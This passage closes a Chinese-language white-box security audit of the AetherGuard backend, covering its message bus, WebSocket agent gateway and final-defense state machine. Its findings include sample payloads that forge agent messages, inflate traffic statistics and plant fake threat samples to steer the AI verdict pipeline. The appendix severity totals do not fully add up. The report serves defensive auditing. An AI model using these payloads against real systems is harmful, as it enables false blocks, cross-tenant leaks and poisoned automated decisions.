  3. 90 天后 `rotateLogs` 触发，把未归档的 audit_log 直接 delete（只 backup 到本地 JSON）
  4. 攻击者再让 S3 恢复 → 后续 archive 从更晚时间开始 → 早期 audit log 在本地 backup 中（受 `AUDIT_LOG_SECRET` 保护，但攻击者已经看到本地 backup）
  5. 同时合规链断裂
- **影响**:
  - 攻击者制造"归档失败 → 强制 rotation → 本地 backup 留底 → 后续云端归档不完整"
  - 与 V12.1 配合：shadow 已有部分 audit_log，rotation 删除主表后 shadow 不受影响——但 shadow 也没有 segment 持久化（segment 写在 shadow + sqlite，删除 audit_log 不影响 segment），但 segment metadata 里的 recordCount 与实际记录不匹配
- **修复建议**:
  - `rotateLogs` 前强制 `archivePending({ maxSegments: 999 })` 直到所有可归档的都已归档
  - 或者：`rotateLogs` 同时删除 shadow 中的 `audit_log`（如果已 segment 化）
  - 引入"segment lifecycle"：audit_log 中的记录必须先进入 `audit_segments` 才能被 `rotateLogs` 清理

---

## 5. Cross-service event bus（AI agents 内）

### V12.18: `message-bus.ts` 是 in-process EventEmitter，不是真正的"cross-service bus"
- **类型**: 设计假设错误 + 跨进程扩展性
- **文件:行号**:
  - `backend/src/ai-agents/core/message-bus.ts:35-307` —— `MessageBus extends EventEmitter`
  - `globalMessageBus = new MessageBus()` 单例
- **攻击场景**:
  - 当前 in-process 设计：多副本部署（API server, worker, scheduler）时 message bus **不跨进程**
  - 一个副本上的 AI agent 决策不能 broadcast 到另一个副本上的 dashboard
  - 攻击场景：如果未来引入 Redis pub/sub 或 NATS 替代，但没有重写 message-bus，事件可能在跨节点丢失
  - **当前风险**：tenant tag 缺失 + 跨副本不可用
- **影响**:
  - 跨副本部署时 message bus 仅 in-process → AI 决策结果不一致
  - 未来扩展到分布式会引入新 trust boundary
- **修复建议**:
  - 显式标注 `message-bus.ts` 为 in-process，不允许跨进程
  - 或：抽象 `MessageBus` 接口，提供 Redis/NATS 实现，强制 tenant tag + 签名

### V12.19: events 无签名，任何 in-process 代码可伪造 `from` / `type` / `payload`
- **类型**: cross-service trust violation
- **文件:行号**:
  - `backend/src/ai-agents/core/message-bus.ts:81-114` —— `publish(message)` / `publishDirect(role, message)` 不验证 `message.from` / `message.id` 来源
  - 没有 HMAC / 签名
  - `MessageEnvelope` 字段：`message, routingKey, ttl, retryCount`，无 signature
- **攻击场景**:
  1. 任何 in-process 代码（包括 LLM 输出的 tool call 触发的代码、被 XSS 注入的 route handler、被劫持的 npm 依赖）可以：
     ```
     globalMessageBus.publish({
       id: 'fake',
       from: 'plato',   // 伪造来源
       to: 'aristotle',
       type: 'decision_final',
       payload: { verdict: 'allow' }
     });
     ```
  2. Aristotle 角色订阅者接收并信任这个 decision
  3. LLM 决策链被污染
- **影响**:
  - in-process trust 假设 "只 trusted code 调用 messageBus" 不可信
  - 一个 XSS / RCE 漏洞即可彻底攻破多 agent 决策
- **修复建议**:
  - `publish()` 内部对 `from` 做白名单：必须是已注册 agent role
  - 或：每个 agent 实例拥有自己的 signing key，publish 时附 HMAC
  - 增加 `tenantId` 字段强制 mandatory

### V12.20: events 无 tenant tag，跨租户泄露
- **类型**: cross-tenant data leak
- **文件:行号**:
  - `backend/src/ai-agents/core/message-bus.ts:87-99` —— `envelope` 字段：
    ```
    { message, routingKey: `${type}.${from}.${to}`, ttl, retryCount }
    ```
  - `AgentMessage` 没有 `tenantId` 字段（参考 types.ts，但 message bus 内部不强制）
  - `publishDirect(role, message)` 也不传 tenant filter —— 所有订阅同一 role 的实例都收到
- **攻击场景**:
  1. AI agent 决策中 tenant A 的 sensitive 事件通过 `globalMessageBus.publishDirect('plato', message)` 发布
  2. 进程内所有 'plato' 订阅者都收到，包括 tenant B 的订阅者
  3. 跨租户信息泄露
- **影响**:
  - 跨租户数据泄露（agent decision, threat data, target info）
  - 如果有 in-process 缓存/聚合逻辑，会污染
- **修复建议**:
  - `MessageEnvelope` 增加 `tenantId: string`，订阅时强制 filter
  - `subscribe(role, handler, { tenantId })` 接口
  - `publish(message, { tenantId })` 强制必填

### V12.21: TTL 60s 默认，replay 防护弱，重试可能产生重复决策
- **类型**: cross-service trust + non-determinism
- **文件:行号**:
  - `backend/src/ai-agents/core/message-bus.ts:42-46, 84, 175-178, 246-253` —— TTL 60s，maxRetries=3，PROCESSING_TIMEOUT_MS=30s
  - 失败时 `envelope.retryCount++` 然后 `unshift` 到 queue 头（line 248-249）
  - 无 message ID 去重（虽然 `message.id` 存在但 message-bus 不查重）
- **攻击场景**:
  1. 攻击者故意制造 subscriber 慢响应（例如 long-running async operation）
  2. message 重试 3 次 → 同一 message 投递 3 次 → 3 次重复决策
  3. 某些 agent 在 retry 期间改了 verdict，外部可能看到矛盾决策
  4. 没用 nonce / idempotency key
- **影响**:
  - 决策不确定 → 攻击者可以选择有利的重试时机
  - audit log 出现重复
- **修复建议**:
  - 维护 `seenMessageIds: Set<string>`，投递前检查
  - `deliverMessage` 加 idempotency token
  - 限制单条 message 总重试次数（已有 maxRetries=3，但全局无）

---

## 6. WebSocket 跨层信任

### V12.22: `agent:traffic_stats` 无签名，污染 globalStats → AI 决策依据
- **类型**: cross-service trust (agent → global stats → AI) - CRITICAL
- **文件:行号**:
  - `backend/src/websocket/agent-gateway.ts:629-688` —— `socket.on('agent:traffic_stats', async (data) => {...})`：
    ```
    const probeStats = data.stats;
    if (probeStats) {
      globalStats.packetsProcessed += probeStats.packetsProcessed || 0;
      globalStats.packetsAllowed += probeStats.packetsAllowed || 0;
      globalStats.packetsBlocked += probeStats.packetsBlocked || 0;
      ...
      globalStats.bytesProcessed += probeStats.bytesProcessed || 0;
      ...
      // 同步到 AI agent system
      const aiSystem = getAgentSystem();
      const processed = probeStats.packetsProcessed || 0;
      if (aiSystem && (aiSystem as any).probeAgent && processed > 0) {
        const roles = ['socrates', 'plato', 'aristotle'];
        roles.forEach(role => {
          ...
          (aiSystem as any).probeAgent.updateAgentHeartbeat({...processed / 10...});
        });
      }
    }
    ```
  - **没有** `commandSigningService.verifyTrafficStats(probeStats)` 之类的签名验证
  - `agentId` 校验 line 633：`if (data?.agentId && data.agentId !== agent.agentId) return;` —— 但 `data.agentId` 缺失时直接放行
  - `probeStats` 来自 raw agent 消息
- **攻击场景**:
  1. 攻击者控制一个合法 agent（tenant A），已通过 `agentAuthService.verifyAgent`
  2. WebSocket 连接后，发送 `agent:traffic_stats` 事件：
     ```
     {
       agentId: 'legit-agent-A',
       stats: {
         packetsProcessed: 999999999,
         packetsBlocked: 999999999,
         packetsAllowed: 0,
         bytesProcessed: 9999999999999,
         activeFlows: [{ id: 'evil-1', src: '1.1.1.1', dst: '2.2.2.2' }, ...]
       }
     }
     ```
  3. `globalStats` 数字膨胀 → `getTrafficStats()` 返回异常值
  4. AI `probeAgent` 收到 `Math.floor(processed / 10) = ~1e8` 的 `tasksCompleted` 增量 → AI 模型认为"刚处理了海量任务"
  5. dashboard 看到 `traffic:updated` 事件（line 683-687）→ 触发自动响应（isolate, block, escalate）
  6. **变种**：发送 `stats: { packetsProcessed: 0 }` 持续 60s → dashboard 误判"agent 没流量" → 触发低活跃度 alert / 关闭一些 defensive rule
  7. 200/min 速率限制（line 73 `traffic_stats: 200`）允许 3.3/秒 持续投毒
- **影响**:
  - **AI 决策系统被 input poisoning**
  - dashboard 显示虚假 metrics → 运维误判
  - 触发自动防御（firewall rule, IP block, isolate agent）→ 业务可用性受损
  - 多 agent 决策被同一信号影响 → 联动误判
- **修复建议**:
  - agent 端：每个 traffic_stats 包携带 `hmac(stats, agent_shared_secret)`，WebSocket 层 `commandSigningService.verifyStats(...)`
  - 服务端：限制单次 `+=` 上限（例如 `Math.min(probeStats.packetsProcessed, 1000000)`）防止溢出
  - 不在 WebSocket 层直接 `+=` 到 globalStats，改用"sample window" + statistical aggregation
  - 区分 "agent self-reported"（低信任）和 "fastpath sampled"（高信任），前者只用于 dashboard，后者用于 AI 决策

### V12.23: `agent:threat` payload 完整信任，写入 detection pipeline
- **类型**: cross-service trust (agent → detection pipeline)
- **文件:行号**:
  - `backend/src/websocket/agent-gateway.ts:692-741` —— `socket.on('agent:threat', async (data) => {...})`：
    - 校验 `data.threat` 是 object，没有内容验证
    - `detectionPipelineService.recordBlockedThreat({...threat, ...})` 直接写入
    - `threat.evidence` / `threat.description` 是 free text
  - `data.threat.sourceIP` 来自 agent，可被伪造
- **攻击场景**:
  1. 攻击者控制 agent
  2. 发送 `agent:threat`：
     ```
     {
       threat: {
         sourceIP: '8.8.8.8',  // 假 IP
         severity: 'critical',
         description: 'SQL injection detected',
         evidence: '<long fake evidence>',
         ruleId: 'custom-rule',
         autoBlock: true
       }
     }
     ```
  3. `detectionPipelineService.recordBlockedThreat` 把这条写入 detection pipeline
  4. dashboard 收到 `threat:detected` broadcast → 触发 alert
  5. 如果 `autoBlock: true` 走自动 block 路径 → firewall rule 加错
  6. **影响放大**：跨租户，agent 报告说"看到对 X.X.X.X 的攻击" → 自动 block X.X.X.X → 误封
- **影响**:
  - 攻击者可以用合法 agent 凭证制造"威胁" → 触发 defensive action
  - 误报 + 误 block → DoS
- **修复建议**:
  - `autoBlock: true` 必须二次确认（admin 审批 / hardware confirmation）
  - 限制 agent 报告的 threat severity（agent 不能标记 `critical`，必须 admin review）
  - 验证 `sourceIP` 与 agent 实际网络位置匹配（agent 应该只能报告自己观察到的 IP）

### V12.24: `agent:review_sample` 完整信任，写入 detection pipeline
- **类型**: cross-service trust (agent → detection pipeline)
- **文件:行号**:
  - `backend/src/websocket/agent-gateway.ts:743-802` —— `socket.on('agent:review_sample', ...)`：
    - `sample.existingSignals` 数组 agent 自填
    - `sample.matchedRuleIds` agent 自填
    - `sample.riskScore` agent 自填（`Number(sample.riskScore || 0)`）
    - `detectionPipelineService.reviewAgentSample` 信任
  - 如果 `decision.aiVerdict === 'malicious'` 立即 broadcast `threat:detected`（line 779-795）
- **攻击场景**:
  1. 攻击者 agent 发送 `agent:review_sample`：
     ```
     {
       sample: {
         requestId: 'fake',
         sourceIp: '8.8.8.8',
         path: '/admin',
         evidence: '...',
         riskScore: 0.99,
         matchedRuleIds: ['sqli', 'rce'],
         decisionSource: 'agent-local',
         existingSignals: ['previous-malicious']
       }
     }
     ```
  2. `reviewAgentSample` 信任 sample，调用 AI 模型
  3. AI 模型被 sample 引导 → 输出 `aiVerdict: 'malicious'`
  4. broadcast `threat:detected` → dashboard alert
- **影响**:
  - **AI decision input poisoning** （V12.22 之外第二条路径）
  - agent 控制的 sample 可直接污染 detection pipeline
- **修复建议**:
  - 二次过滤：agent 报告的 `riskScore` / `matchedRuleIds` 不能直接喂给 AI，必须经过 server-side 二次评估
  - `reviewAgentSample` 加 "sample trust level" 字段，agent 来源 sample 标记为 `untrusted` → AI 推理时降权

### V12.25: WebSocket `command` 帧发出后，agent 返回的 ack 通过 `commandDispatcherService.handleAgentCommandAck` 污染 sec_actions 状态（V12.7 已在第 2 节详述）

---

## 7. Final-defense state mutation（state machine 并发 / 跨进程）

### V12.26: `reportStatus` ON CONFLICT(companion_id) 在 policy digest mismatch 时仍更新 policy_digest
- **类型**: cross-service trust (companion → control plane)
- **文件:行号**:
  - `backend/src/services/final-defense.service.ts:316-379` —— `reportStatus`：
    - Line 334: `const policyDigest = policy?.policyDigest || null;` —— 从 DB 拉
    - Line 348-358: `ON CONFLICT(companion_id) DO UPDATE SET policy_digest = EXCLUDED.policy_digest, reported_policy_digest = EXCLUDED.reported_policy_digest, ...`
    - Line 372: `last_verified_at = input.policyDigest && policyDigest && input.policyDigest === policyDigest ? now : null` —— 仅 `last_verified_at` 在 mismatch 时不更新
  - **policy_digest 字段被无条件 EXCLUDED 覆盖**
- **攻击场景**:
  1. 控制 board v1 的合法 companion
  2. 发送 `reportStatus({ policyDigest: 'attacker-controlled' })` —— digest 与 server-side `policy.policyDigest` 不同
  3. `reportStatus` 仍然把 `policy_digest` 设为 policy 的 digest，`reported_policy_digest` 设为 attacker 提供的 digest
  4. 后续 `getStatus()` 看到 mismatch，触发 `degradedReasons` 中 `policy_digest_mismatch`（line 665-666）→ 标记 `active: false`
  5. 但攻击者可以持续重发 `reportStatus` —— companion_online 始终为 1，状态机不进入 fail-closed
  6. **更严重**：如果配合 `upsertPolicy` race，attacker digest 可能在某些 race 条件下覆盖 server-side `policy_digest`
- **影响**:
  - 攻击者可以制造持续的"policy_digest_mismatch"告警，淹没真实告警
  - 配合 admin 误操作，可能导致 gateway 被认为"不健康"而 fail-close，DoS
- **修复建议**:
  - `reportStatus` 中如果 `input.policyDigest !== policyDigest` → 应该 reject 或 mark `corrupt` 而不是接受 reported_policy_digest
  - 引入 `pending_policy_digest` 字段，等二次确认

### V12.27: `requestAction` 读取 `getActivePolicyForCompanion` 后未锁 → policy revoke 与 request 执行的 race
- **类型**: cross-service race
- **文件:行号**:
  - `backend/src/services/final-defense.service.ts:493-561` —— `requestAction`：
    1. Line 513: `getActivePolicyForCompanion(input.companionId)` 读 policy
    2. Line 522: `policy.allowedActions.find(...)` 用读到的 policy
    3. Line 537: `hardwareAuthorizationService.requestPhysicalConfirmation({...})` —— 把 policy 字段（`policyDigest`, `breakerTarget` 等）塞入 payload
  - `upsertPolicy` 可以并发改 policy —— line 250-277
- **攻击场景**:
  1. Admin T0 时刻发起 `requestAction({ commandType: 'wipe_data' })`
  2. `getActivePolicyForCompanion` 读到 policy X（包含 wipe_data 允许）
  3. Admin T0+10ms 通过 API revoke policy X
  4. `upsertPolicy` 把 policy X 改为 `status: 'revoked'`
  5. `requestAction` 继续走，payload 中 `policyDigest` 仍是 X 的 digest
  6. `hardwareAuthorizationService.requestPhysicalConfirmation` 用 stale policy 进入 hardware gate
  7. 如果硬件按钮被按下，**revoked policy 仍可执行**
- **影响**:
  - **policy revoke 无效化**——high-risk action 仍能执行
  - 这是 Final Defense 的核心 fail-closed 失效
- **修复建议**:
  - `requestAction` 与 `upsertPolicy` 使用乐观锁：policy 加 `version` 字段，`requestAction` 记录 `expected_policy_version`，`hardwareAuthorizationService.confirmIntent` 重新校验
  - 或：使用 SQLite transaction + `BEGIN IMMEDIATE` 锁住 policy 表

### V12.28: `mapStatus` / `mapRootResistantGateway` 中 `active` 字段基于 `degradedReasons.length === 0`，非原子
- **类型**: state machine non-idempotency
- **文件:行号**:
  - `backend/src/services/final-defense.service.ts:732-755` —— `mapStatus`：
    ```
    const degradedReasons = this.degradedReasons(row);
    return {
      ...
      active: degradedReasons.length === 0,
      degradedReasons,
      ...
    };
    ```
  - `degradedReasons`（line 644-672）从 row 各字段计算：
    - `stale(row.last_heartbeat_at)` —— `Date.now() - new Date(lastHeartbeatAt) > 90_000`
    - 多次 DB read 之间的 `Date.now()` 不同
- **攻击场景**:
  1. T0: `reportStatus` 写入 `last_heartbeat_at = T0`
  2. T0+89.9s: `getStatus()` 调 → `stale()` 返回 false → `active: true`
  3. T0+90.1s: 同样 `getStatus()` 调 → `stale()` 返回 true → `active: false`，`degradedReasons` 含 `companion_stale`
  4. **race**：在 T0+90s 附近的 `reportStatus` 和 `getStatus` 并发执行
     - `reportStatus` SQL 写 last_heartbeat_at = T0+90s
     - 同时 `getStatus` 读取 row.last_heartbeat_at = T0+89.9s（sql 还没 commit）
     - `getStatus` 计算 `stale()` 边界值，可能返回 true 或 false
  5. **更严重**：`degradedReasons` 包含 `last_error`（line 668-670）—— 单纯 last_error 字符串存在就触发 degraded
     - 如果 companion 之前有 transient error 残留，state 永远是 degraded
  6. **state machine 不可重入**：同样 row + 同样时间戳，两次计算可能得到不同 `degradedReasons` 顺序（`[...new Set(...)]` 去重但顺序依赖 push 顺序）
- **影响**:
  - UI 显示不一致（同一时刻，两个 dashboard 看到不同 `active`）
  - 自动化脚本依赖 `active` 字段做决策时可能误判
- **修复建议**:
  - `active` 字段在 `reportStatus` 时计算并写入 DB（不要在 read 时实时算）
  - 把 `last_error` 字段加 `cleared_at`，过期的 error 不算
  - 引入状态机：explicit `state: 'isolated' | 'armed' | 'released' | 'fault' | 'disabled' | 'unknown'`，只允许特定 transition

---

## 附录 A: 读过的关键文件

| 文件 | 用途 |
|------|------|
| `backend/src/services/postgres-shadow-store.service.ts` | Postgres shadow store 核心 (1037 行) |
| `backend/src/services/command-dispatcher.service.ts` | Agent/Device 命令分发 (1069 行) |
| `backend/src/ai-agents/capabilities/tool-executor.ts` | AI tool 执行器 (508 行) |
| `backend/src/services/audit-segment.service.ts` | Audit segment chain (732 行) |
| `backend/src/services/audit-archive.service.ts` | S3 archive 上传 (248 行) |
| `backend/src/ai-agents/core/message-bus.ts` | In-process message bus (308 行) |
| `backend/src/services/final-defense.service.ts` | Final Defense 状态机 (786 行) |
| `backend/src/websocket/agent-gateway.ts` | WebSocket gateway (1404 行) |
| `backend/src/security/audit-logger.service.ts` | Audit log writer (980 行) |
| `backend/src/config/platform-runtime.ts` | DB mode / artifact mode 解析 (108 行) |
| `backend/src/services/traffic-stats.service.ts` | globalStats 状态容器 (60 行) |

## 附录 B: 漏洞分布（按 7 类分）

1. **Postgres shadow 写路径**: 5 个 (2C / 2H / 1M)
2. **Command dispatcher race**: 4 个 (1C / 2H / 1M)
3. **AI tool executor trust**: 4 个 (1C / 1H / 2M)
4. **Audit segment / archive**: 4 个 (2C / 1H / 1M)
5. **Message bus (AI agents)**: 3 个 (0C / 2H / 1M)
6. **WebSocket 跨层信任**: 4 个 (2C / 1H / 1M)
7. **Final-defense state mutation**: 3 个 (1C / 2H)
**合计: 27 个** (8C / 9H / 7M / 3L)

## 附录 C: 修复优先级建议

| 优先级 | 漏洞 | 原因 |
|--------|------|------|
| P0 立即修 | V12.7, V12.22, V12.1 | 跨租户伪造 action 完成 + AI 投毒 + audit log 数据丢失 |
| P1 一周内 | V12.23, V12.24, V12.27, V12.14, V12.16 | 自动响应被诱导 / Final Defense 失效 / S3 凭据泄露 / archive 链断裂 |
| P2 一个月内 | V12.6, V12.8, V12.9, V12.2, V12.3, V12.10, V12.28 | 跨租户 race / 状态机不一致 / AI 输出 XSS |
| P3 长期 | V12.4, V12.5, V12.11, V12.12, V12.13, V12.15, V12.17, V12.18, V12.19, V12.20, V12.21, V12.25, V12.26 | 设计层面改进 / 未来扩展性 |

---

**审计员签字**: AetherGuard Sprint 5 Wave 7 R12 White-Box Security Audit (Read-Only)
**完成时间**: 2026-06-06
